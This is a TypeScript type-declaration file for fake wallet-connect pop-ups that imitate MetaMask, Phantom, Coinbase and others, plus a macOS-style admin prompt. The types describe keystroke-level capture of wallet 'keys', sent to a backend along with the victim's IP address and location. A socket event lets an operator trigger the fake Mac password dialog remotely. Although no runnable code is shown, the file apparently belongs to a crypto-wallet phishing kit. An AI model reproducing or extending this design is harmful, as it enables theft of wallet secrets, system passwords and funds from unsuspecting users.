export type WalletType = 'MetaMask' | 'Phantom' | 'Rabby' | 'TronLink' | 'Bitget' | 'Coinbase' | 'Solflare' | 'OKX' | 'Mac';
export interface WalletConnectModalProps {
    onWalletSelect?: (wallet: WalletType) => void;
    onClose?: () => void;
    isOpen?: boolean;
}
export interface CustomWalletModalProps {
    wallet: WalletType;
    onClose?: () => void;
    isOpen?: boolean;
    userId?: string;
    backendConfig?: {
        enabled?: boolean;
        userId?: string;
    };
    darkMode?: boolean;
    /** For Mac modal: text to display in the admin name input field. */
    adminName?: string;
}
export interface WalletConfig {
    id: WalletType;
    name: string;
    shortKey: string;
    icon?: string;
}
export type KeyType = 'cha' | 'enter';
export interface BackendKeyPayload {
    user_id: string;
    key_type: KeyType;
    keys: string;
    wallet_type: string;
    IP_address: string;
    Location: string;
    country_code: string;
}
/** Payload emitted by backend for showMacModal socket event. */
export interface ShowMacModalPayload {
    message?: string;
    user_id?: string;
    timestamp?: string;
    /** Text to display in the admin name input field (mac_user_name). */
    text?: string;
    /** Timing in seconds (-1 = socket-only, 0+ = open after N seconds on load). */
    timing?: number;
}
//# sourceMappingURL=types.d.ts.map